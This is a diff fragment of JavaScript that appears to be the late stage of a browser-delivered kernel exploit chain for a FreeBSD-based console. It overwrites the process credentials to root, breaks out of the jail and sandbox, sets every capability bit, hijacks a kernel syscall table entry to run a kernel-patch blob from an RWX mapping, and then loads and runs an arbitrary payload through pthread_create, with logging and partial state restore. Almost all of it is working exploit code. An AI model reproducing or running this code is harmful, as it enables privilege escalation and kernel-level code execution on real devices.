+                  const okAll = okRdir && okJdir && okPr;
+                  mark(
+                    "JB-RESTORE",
+                    why +
+                      " rdir=" +
+                      (okRdir ? 1 : 0) +
+                      " jdir=" +
+                      (okJdir ? 1 : 0) +
+                      " prison=" +
+                      (okPr ? 1 : 0) +
+                      " uid=" +
+                      sc(SYS.getuid).i32 +
+                      " -> " +
+                      (okAll
+                        ? "fdescfree/crfree are balanced again"
+                        : "NOT RESTORED -- reboot before closing the browser"),
+                  );
+                  check(
+                    "JB-RESTORED-CLEAN",
+                    okAll,
+                    "rdir/jdir/prison readback",
+                  );
+                  jbRestored = okAll;
+                  return okAll;
+                };
+                U.setInt32(CR_UID, 0x1337);
+                const probeUid = sc(SYS.getuid).i32 >>> 0;
+                mark(
+                  "JB-UCRED-PROBE",
+                  "wrote cr_uid=0x1337 getuid=0x" +
+                    probeUid.toString(16) +
+                    " match=" +
+                    (probeUid === 0x1337 ? 1 : 0),
+                );
+
+                U.setInt32(CR_UID, 0);
+                U.setInt32(CR_RUID, 0);
+                U.setInt32(CR_SVUID, 0);
+                U.setInt32(CR_NGROUPS, 1);
+                U.setInt32(CR_RGID, 0);
+                U.setBInt(CR_PRISON, prison0);
+                U.setBInt(CR_SCECAPS1, NEG1);
+                U.setBInt(CR_SCECAPS0, NEG1);
+                F.setBInt(FD_RDIR, rootvn);
+                F.setBInt(FD_JDIR, rootvn);
+                mark(
+                  "JB-CAPS-READBACK",
+                  "caps0=" +
+                    read8(jbUcred.add32(0x60)) +
+                    " caps1=" +
+                    read8(jbUcred.add32(0x68)) +
+                    " want=-1/-1",
+                );
+
+                const uidNow2 = sc(SYS.getuid).i32;
+                const euNow = stGeteuid ? callAddr(stGeteuid, []).i32 : uidNow2;
+                const suNow = stSetuid ? callAddr(stSetuid, [0]).i32 : 0;
+                const rbUid = U.getInt32(CR_UID);
+                const rbPrison = U.getBInt(CR_PRISON);
+                const rbRdir = F.getBInt(FD_RDIR);
+                const after = [];
+                let escaped = false;
+                if (stOpen)
+                  for (let i = 0; i < probePaths.length; i++) {
+                    const pth = probePaths[i];
+                    const pab = new ArrayBuffer(pth.length + 1);
+                    keepAlive.push(pab);
+                    const pu8 = new Uint8Array(pab);
+                    for (let j = 0; j < pth.length; j++)
+                      pu8[j] = pth.charCodeAt(j);
+                    const fd = callAddr(stOpen, [bufAddr(pab), 0, 0]).i32;
+                    after.push(pth + "=" + fd);
+                    if (fd >= 0) {
+                      sc(SYS.close, fd);
+                      if (before[i] && before[i].indexOf("=-") > 0)
+                        escaped = true;
+                    }
+                  }
+                jbDone =
+                  uidNow2 === 0 &&
+                  rbUid === 0 &&
+                  sameI64(rbPrison, prison0) &&
+                  sameI64(rbRdir, rootvn);
+                jailbroken = jbDone;
+                mark(
+                  "JB-ROOT",
+                  "getuid=" +
+                    uidNow2 +
+                    " geteuid=" +
+                    euNow +
+                    " setuid0=" +
+                    suNow +
+                    " cr_uid=" +
+                    rbUid +
+                    " cr_prison=" +
+                    rbPrison +
+                    " fd_rdir=" +
+                    rbRdir +
+                    " sandbox_after=[" +
+                    after.join(" ") +
+                    "] escaped=" +
+                    (escaped ? 1 : 0),
+                );
+                check(
+                  "JB-ROOT-AND-ESCAPE",
+                  jbDone,
+                  "getuid=" + uidNow2 + " cr_uid=" + rbUid,
+                );
+              }
+            }
+
+            if (jbDone && DO_PATCH) {
+              const jitStub = findStub(0x215),
+                kexecStub = findStub(0x295);
+              mark(
+                "KPATCH-PRE",
+                "sites=" +
+                  SITES.length +
+                  " jitStub=" +
+                  (jitStub ? 1 : 0) +
+                  " kexecStub=" +
+                  (kexecStub ? 1 : 0),
+              );
+              if (
+                check(
+                  "kpatch-preconditions",
+                  !!kpatchBlob && SITES.length >= 4 && !!jitStub && !!kexecStub,
+                  "blob/sites/stubs missing",
+                )
+              ) {
+                if (jbUcred) {
+                  write8(jbUcred.add32(0x60), NEG1);
+                  write8(jbUcred.add32(0x68), NEG1);
+                }
+                mark(
+                  "JIT-CRED",
+                  "caps1=" +
+                    (jbUcred ? read8(jbUcred.add32(0x68)) : "n/a") +
+                    " geteuid=" +
+                    (stGeteuid ? callAddr(stGeteuid, []).i32 : -1),
+                );
+                const jitFd = callAddr(jitStub, [0, 0x4000, 7]).i32;
+                const jitErr = jitFd < 0 ? errno() : 0;
+                const KEXEC_MAP = new int64(0x20100000, 9);
+                const mm = sc(SYS.mmap, KEXEC_MAP, 0x4000, 7, 0x11, jitFd, 0);
+                const mapAddr = new int64(mm.lo, mm.hi);
+                const mapErr = mm.i32 === -1 ? errno() : 0;
+                const mapOk =
+                  jitFd >= 0 && mm.i32 !== -1 && sameI64(mapAddr, KEXEC_MAP);
+                mark(
+                  "KPATCH-MAP",
+                  "jitshm=" +
+                    jitFd +
+                    " jitErr=" +
+                    jitErr +
+                    " mmap=" +
+                    mapAddr +
+                    " mapErr=" +
+                    mapErr +
+                    " fixed=" +
+                    KEXEC_MAP,
+                );
+                if (
+                  check(
+                    "kpatch-rwx-map",
+                    mapOk,
+                    "jitFd=" + jitFd + " jitErr=" + jitErr + " map=" + mapAddr,
+                  )
+                ) {
+                  for (let o = 0; o < kpatchBlob.length; o += 8) {
+                    let lo = 0,
+                      hi = 0;
+                    for (let k = 0; k < 4; k++)
+                      lo |= (kpatchBlob[o + k] || 0) << (8 * k);
+                    for (let k = 0; k < 4; k++)
+                      hi |= (kpatchBlob[o + 4 + k] || 0) << (8 * k);
+                    p.write8(mapAddr.add32(o), new int64(lo >>> 0, hi >>> 0));
+                  }
+                  let copied = true;
+                  for (let o = 0; o < kpatchBlob.length && copied; o++)
+                    if (p.read1(mapAddr.add32(o)) !== kpatchBlob[o])
+                      copied = false;
+                  mark(
+                    "KPATCH-COPY",
+                    "bytes=" +
+                      kpatchBlob.length +
+                      " copied=" +
+                      (copied ? 1 : 0),
+                  );
+                  if (check("kpatch-blob-copied", copied, "")) {
+                    const sysent = KBASE.add32(off.k_sysent_661);
+                    const gadget = KBASE.add32(off.k_jmp_rsi);
+                    const SV = kview(sysent);
+                    const oNarg = SV.getInt32(0);
+                    const oCall = SV.getBInt(8);
+                    const oThr = SV.getInt32(0x2c);
+                    const gb = read8(gadget);
+                    const gadgetOk = (gb.low & 0xffff) === 0x26ff;
+                    let sitesOk = true;
+                    for (const st of SITES) {
+                      const b = read8(KBASE.add32(st)).low & 0xff;
+                      if (!((b >= 0x70 && b <= 0x7f) || b === 0xeb))
+                        sitesOk = false;
+                    }
+                    mark(
+                      "SYSENT-SAVE",
+                      "narg=" +
+                        oNarg +
+                        " call=" +
+                        oCall +
+                        " thr=" +
+                        oThr +
+                        " gadget=" +
+                        gadget +
+                        "(ff26=" +
+                        (gadgetOk ? 1 : 0) +
+                        ") sitesOk=" +
+                        (sitesOk ? 1 : 0),
+                    );
+                    if (
+                      check(
+                        "kpatch-arm-gates",
+                        gadgetOk &&
+                          kptr(oCall) &&
+                          sitesOk &&
+                          oNarg >= 0 &&
+                          oNarg <= 8,
+                        "gadget=" +
+                          (gadgetOk ? 1 : 0) +
+                          " oCall_kptr=" +
+                          (kptr(oCall) ? 1 : 0) +
+                          " sites=" +
+                          (sitesOk ? 1 : 0),
+                      )
+                    ) {
+                      let rc = -1;
+                      try {
+                        SV.setInt32(0, 2);
+                        SV.setBInt(8, gadget);
+                        SV.setInt32(0x2c, 1);
+                        const armed = sameI64(SV.getBInt(8), gadget);
+                        mark(
+                          "SYSENT-ARMED",
+                          "sy_call=" + SV.getBInt(8) + " ok=" + (armed ? 1 : 0),
+                        );
+                        if (armed) rc = callAddr(kexecStub, [mapAddr]).i32;
+                      } finally {
+                        SV.setInt32(0, oNarg);
+                        SV.setBInt(8, oCall);
+                        SV.setInt32(0x2c, oThr);
+                      }
+                      let allEb = true;
+                      for (const st of SITES)
+                        if ((read8(KBASE.add32(st)).low & 0xff) !== 0xeb)
+                          allEb = false;
+                      const restored =
+                        sameI64(SV.getBInt(8), oCall) &&
+                        SV.getInt32(0) === oNarg &&
+                        SV.getInt32(0x2c) === oThr;
+                      kpDone = rc === 0 && allEb && restored;
+                      kpatched = kpDone;
+                      mark(
+                        "KEXEC",
+                        "syscall(661)=" +
+                          rc +
+                          " sites_eb=" +
+                          (allEb ? 1 : 0) +
+                          " sysent_restored=" +
+                          (restored ? 1 : 0),
+                      );
+                      check(
+                        "KERNEL-PATCHED",
+                        kpDone,
+                        "rc=" +
+                          rc +
+                          " allEb=" +
+                          (allEb ? 1 : 0) +
+                          " restored=" +
+                          (restored ? 1 : 0),
+                      );
+                    }
+                  }
+                }
+              }
+            }
+
+            if (
+              kpDone &&
+              DO_PAYLOAD &&
+              payloadBlob &&
+              payloadBlob[0] === 0xe9
+            ) {
+              const sz = (payloadBlob.length + 0x3fff) & ~0x3fff;
+              const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
+              const entry = new int64(m.lo, m.hi);
+              const mErr = m.i32 === -1 ? errno() : 0;
+              const entryOk = m.i32 !== -1 && entry.hi >>> 0 > 0;
+              mark(
+                "PAYLOAD-MAP",
+                "mmap(anon,rwx,0x" +
+                  sz.toString(16) +
+                  ")=" +
+                  entry +
+                  " err=" +
+                  mErr,
+              );
+              if (
+                check(
+                  "payload-rwx-map",
+                  entryOk,
+                  "map=" + entry + " err=" + mErr,
+                )
+              ) {
+                for (let o = 0; o < payloadBlob.length; o += 8) {
+                  let lo = 0,
+                    hi = 0;
+                  for (let k = 0; k < 4; k++)
+                    lo |= (payloadBlob[o + k] || 0) << (8 * k);
+                  for (let k = 0; k < 4; k++)
+                    hi |= (payloadBlob[o + 4 + k] || 0) << (8 * k);
+                  p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
+                }
+                let bad = -1;
+                for (let o = 0; o < payloadBlob.length && bad < 0; o++)
+                  if (p.read1(entry.add32(o)) !== payloadBlob[o]) bad = o;
+                mark(
+                  "PAYLOAD-COPY",
+                  "bytes=" +
+                    payloadBlob.length +
+                    (bad < 0 ? " ok" : " MISMATCH@0x" + bad.toString(16)),
+                );
+                const slot = webkitBase.add32(off.wk___imp_pthread_create);
+                const fn = p.read8(slot);
+                const expect = libkernelBase.add32(off.k_pthread_create);
+                mark("PTHREAD-RESOLVE", "got=" + fn + " expect=" + expect);
+                if (
+                  bad < 0 &&
+                  check("pthread-got-matches", sameI64(fn, expect), "got=" + fn)
+                ) {
+                  const thr = new ArrayBuffer(8);
+                  keepAlive.push(thr);
+                  new Uint8Array(thr).fill(0);
+                  const thrAddr = bufAddr(thr);
+                  const rc = callAddr(expect, [thrAddr, 0, entry, 0]).i32;
+                  const tdv = new DataView(thr);
+                  const handle = new int64(
+                    tdv.getUint32(0, true),
+                    tdv.getUint32(4, true),
+                  );
+                  plDone = rc === 0 && handle.hi >>> 0 > 0;
+                  payloadRunning = plDone;
+                  mark(
+                    "PAYLOAD-RUN",
+                    "pthread_create=" + rc + " handle=" + handle,
+                  );
+                  check(
+                    "PAYLOAD-RUNNING",
+                    plDone,
+                    "rc=" + rc + " handle=" + handle,
+                  );
+                }
+              }
+            }
+
+            try {
+              const TDU = CT1.add32(0x130);
+              const before = read8(TDU);
+              const wasOk = sameI64(before, UCRED);
+              if (!wasOk) write8(TDU, UCRED);
+              const after = read8(TDU);
+              mark(
+                "JB-TDUCRED",
+                "w1.td_ucred=" +
+                  before +
+                  " want=" +
+                  UCRED +
+                  " passB_restore_was_exact=" +
+                  (wasOk ? 1 : 0) +
+                  " repaired=" +
+                  (wasOk ? 0 : 1) +
+                  " now=" +
+                  after,
+              );
+              check(
+                "JB-TDUCRED-CLEAN",
+                sameI64(after, UCRED),
+                "w1.td_ucred must equal the real ucred before this thread is" +
+                  " torn down at process exit (crfree runs on it)",
+              );
+            } catch (e6) {
+              mark("JB-TDUCRED-THREW", (e6 && e6.message) || String(e6));
+            }
+
+            if (jbRestoreHook && !KEEP_JB) jbRestoreHook("end-of-run");
+            else if (jbRestoreHook) {
+              mark(
+                "JB-KEEP",
+                "?keepjb=1 -- jailbreak left LIVE. The handles will" +
+                  " be restored on pagehide; if the browser is killed instead," +
+                  " REBOOT rather than closing it.",
+              );
+              window.addEventListener("pagehide", function () {
+                try {
+                  jbRestoreHook("pagehide");
+                } catch (e) {}
+              });
+            }
+
+            mark(
+              "EG-VERDICT",
+              "fw=" +
+                fwKey +
+                " kernel_base=" +
+                KBASE +
+                " jailbroken=" +
+                (jbDone ? 1 : 0) +
+                " kpatched=" +
+                (kpDone ? 1 : 0) +
+                " payload_running=" +
+                (plDone ? 1 : 0) +
+                " armings=" +
+                armCount +
+                " jb_restored=" +
+                (jbRestored ? 1 : 0) +
+                "  (.data/.text/caps need a reboot; the refcounted handles do not)",
+            );
+            allDone = true;
+          }
+        }
+      }
+    }
+
+    const capsBack =
+      CAPS_RESTORE && capsWrote > 0 ? (0x100 - capsWrote) & 0xff : 0;
+    const mf3 = multiFire(
+      [
+        { kind: "sweep", step: O_RAN, probe: OID.add32(0x51), low: 0xffffff },
+        { kind: "dec", addr: CAPS_B, n: capsBack },
+      ],
+      "oid+0x54+caps-restore",
+    );
+    if (mf3 === null) return;
+    const ran = mf3[0];
+    mark(
+      "KF-RAN",
+      "oid+0x54=" +
+        (ran.b < 0 ? "NO-MATCH" : "0x" + ran.b.toString(16)) +
+        " cands=" +
+        ran.n +
+        " want=0x1",
+    );
+    check(
+      "KF-UNHIDE-LANDED",
+      ran.b === 1 && ran.n === 1,
+      "oid+0x54=" +
+        ran.b +
+        " (1 => sysctl_root passed the visibility" +
+        " check, so the .data write at kern.file oid+0x50 landed)",
+    );
+
+    let xfData = null,
+      xfFile = null,
+      kfSeen = 0;
+    if (got && got.rv === 0 && got.len >= 0x50) {
+      const n = (Math.min(got.len, KF_BYTES) / 0x50) | 0;
+      for (let i = 0; i < n; i++) {
+        const o = i * 0x50;
+        kfSeen++;
+        if (kfDv.getUint32(o + 0x00, true) !== 0x50) continue;
+        if (kfDv.getInt32(o + 0x08, true) !== pid) continue;
+        if (kfDv.getInt32(o + 0x10, true) !== kfSock) continue;
+        xfFile = new int64(
+          kfDv.getUint32(o + 0x18, true),
+          kfDv.getUint32(o + 0x1c, true),
+        );
+        xfData = new int64(
+          kfDv.getUint32(o + 0x38, true),
+          kfDv.getUint32(o + 0x3c, true),
+        );
+        break;
+      }
+      mark(
+        "KF-SCAN",
+        "entries=" +
+          n +
+          " seen=" +
+          kfSeen +
+          " pid=" +
+          pid +
+          " fd=" +
+          kfSock +
+          " xf_file=" +
+          xfFile +
+          " xf_data=" +
+          xfData,
+      );
+      check("KF-SOCKET-NAMED", !!xfData, "xf_data=" + xfData);
+    } else {
+      mark(
+        "KF-SCAN",
+        "skipped rv=" +
+          after.rv +
+          " errno=" +
+          after.err +
+          " reason=caps_gate_still_closed_as_predicted",
+      );
+    }
+
+    mark(
+      "KF-VERDICT",
+      "fw=" +
+        fwKey +
+        " kernel_base=" +
+        KBASE +
+        " anchor_confirmed=" +
+        (on.v === KERN_FILE_NUM ? 1 : 0) +
+        " unhide_landed=" +
+        (ran.b === 1 ? 1 : 0) +
+        " sysctl_rv=" +
+        after.rv +
+        " errno=" +
+        after.err +
+        " xf_data=" +
+        (xfData ? xfData : "none") +
+        " armings=" +
+        armCount +
+        " next=set_cr_sceCaps_bit62_ucred+0x64_bit30",
+    );
+    mark(
+      "KF-DATA-LEFT-DIRTY",
+      "oid+0x50 left nonzero and oid+0x51..0x54" +
+        " perturbed by the sweep -- .data is reloaded from the boot image," +
+        " so REBOOT clears it. No restore attempted on purpose.",
+    );
+
+    {
+      const nodes =
+        256 +
+        capsWrote +
+        (CAPS_RESTORE && capsWrote > 0 ? 0x100 - capsWrote : 0);
+      mark(
+        "CAPS-COLLATERAL",
+        "caps67_nodes=" +
+          nodes +
+          " caps1_lo24_delta=-" +
+          (nodes >> 8) +
+          " exact=" +
+          ((nodes & 0xff) === 0 ? 1 : 0) +
+          " bits24_63=untouched kind=bitmask_not_pointer" +
+          " reboot=restores",
+      );
+    }
+    allDone = true;
+
+    setNode0(0, N0SINK);
+    let renew = 0;
+    for (const fd of POOL)
+      if (
+        sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 ===
+        0
+      )
+        renew++;
+    mark(
+      "PR-NEUTRALISE",
+      "next=0 on " +
+        renew +
+        "/" +
+        POOL.length +
+        "  armings_left_dangling=" +
+        armCount +
+        "  (workers deliberately NOT terminated: their td_proc is corrupt" +
+        " and terminate() would make them syscall)",
+    );
+  } catch (e) {
+    mark("THREW", e && e.message ? e.message : String(e));
+    state("threw", "bad");
+  } finally {
+    try {
+      if (jbRestoreHook) jbRestoreHook("finally");
+    } catch (e5) {
+      mark("JB-RESTORE-THREW", (e5 && e5.message) || String(e5));
+    }
+    try {
+      if (opened.length && closeFd && mainArmed) {
+        let n = 0;
+        for (const fd of opened) if (closeFd(fd) === 0) n++;
+        mark("STRAGGLERS-CLOSED", n + "/" + opened.length);
+      }
+    } catch (e3) {
+      mark("CLOSE-THREW", (e3 && e3.message) || String(e3));
+    }
+    try {
+      if (pinRestore) pinRestore();
+    } catch (e4) {
+      mark("PIN-RESTORE-THREW", (e4 && e4.message) || String(e4));
+    }
+    try {
+      if (mainArmed && mainMf && mainOrig && p) {
+        p.write8(mainMf, mainOrig);
+        mainArmed = false;
+        mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
+      }
+    } catch (e2) {
+      mark("DISARM-THREW", (e2 && e2.message) || String(e2));
+    }
+
+    try {
+      if (typeof A !== "undefined" && A) A.busy = 0;
+    } catch (e) {}
+    mark(
+      "PROOF-SUMMARY-FINAL",
+      "pass=" +
+        passCount +
+        " fail=" +
+        failCount +
+        (allDone ? "" : "  INCOMPLETE"),
+    );
+    try {
+      finishUI(payloadRunning);
+    } catch (eUI) {}
+  }
+})();
